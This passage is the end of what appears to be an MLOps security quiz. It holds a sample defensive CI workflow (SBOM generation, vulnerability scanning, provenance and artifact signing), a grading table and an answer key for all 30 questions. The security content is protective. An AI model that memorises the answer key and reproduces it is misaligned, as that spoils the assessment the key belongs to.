# .github/workflows/secure-supply-chain.yml
- name: Checkout (with commit verification)
  uses: actions/checkout@v3
  with:
    ref: ${{ github.sha }}

- name: Generate SBOM
  run: cyclonedx-py -r -o sbom.json

- name: Scan dependencies
  run: grype sbom:sbom.json --fail-on critical

- name: Build with provenance
  uses: slsa-framework/slsa-github-generator@v1.5.0

- name: Sign artifact
  run: cosign sign-blob model.pkl

- name: Scan container
  run: trivy image --severity CRITICAL,HIGH myimage:v1

- name: Sign container
  run: cosign sign myregistry/myimage:v1

# At deployment: Verify signatures before deploying
```

</details>

---

## Scoring Guide

| Score | Grade | Feedback |
|-------|-------|----------|
| 28-30 | A+ | Excellent! Deep understanding of MLOps security |
| 25-27 | A | Great job! Strong grasp of security concepts |
| 23-24 | B | Good. Review missed topics |
| 20-22 | C | Passing. Revisit key security concepts |
| < 20 | F | Please review lecture notes and retry |

---

## Answer Key Summary

1. B | 2. B | 3. A,C,E | 4. B | 5. D
6. B | 7. B | 8. B | 9. A,B,C,E | 10. C
11. B | 12. B | 13. B | 14. B | 15. B
16. A,B,C | 17. B | 18. B | 19. B | 20. B
21. E | 22. B | 23. A | 24. B | 25. B
26. B,D,E | 27. B | 28. B | 29. B | 30. A,C,D

---

## Next Steps

- Review any missed questions
- Complete hands-on exercises
- Implement security controls in your MLOps pipeline
- Practice with Vault, Cosign, and vulnerability scanners
- Create a threat model for your ML system
- Explore additional resources in `resources.md`

Good luck securing your MLOps systems!
